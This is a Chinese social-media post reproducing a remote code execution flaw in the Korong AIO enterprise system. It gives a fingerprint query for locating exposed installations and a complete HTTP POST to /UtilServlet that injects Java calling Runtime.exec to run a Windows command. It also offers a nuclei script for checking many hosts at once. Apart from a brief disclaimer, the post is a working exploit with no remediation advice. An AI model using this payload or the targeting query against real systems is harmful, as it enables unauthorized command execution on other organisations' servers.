#  【漏洞复现】科荣AIO系统存在代码执行漏洞   
devildollking  新势界NewFrontier   2025-01-13 03:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.2500397116661788&random=0.331463449447553&random=0.8263159340656969 "")  
  
免责声明  
  
 该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。公众号现在只对常读和星标的公众号才展示大图推送，建议把公众号设为星标，否则可能就看不到啦！感谢各位师傅。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818 "")  
  
资产收集  
```
body="changeAccount('8000')"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j917OIDfjTLzkmED8YT3lPtw9K7q5PHqyQIpSzAyficgMAg0Y6fjl0yzUYkKfFtFlibPbyrSwvWygPib7A/640?wx_fmt=png&from=appmsg "")  
  
发送请求  
```
POST /UtilServlet HTTP/1.1
Host: 
User-Agent:Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/534.57.2(KHTML, like Gecko)Version/5.1.7Safari/534.57.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length:322
operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HboZfk6j917OIDfjTLzkmED8YT3lPtw9SGSQEia02kRJxZQuhWHAL6J5uH4HcMM89KO97wpJo5icNRviaWGNYvdCw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818 "")  
  
批量验证脚本  
  
关注公众号  
并回复   
“ZH-2025-01-13-001  
”  
 即可获得该漏洞nuclei脚本  
  
  
  
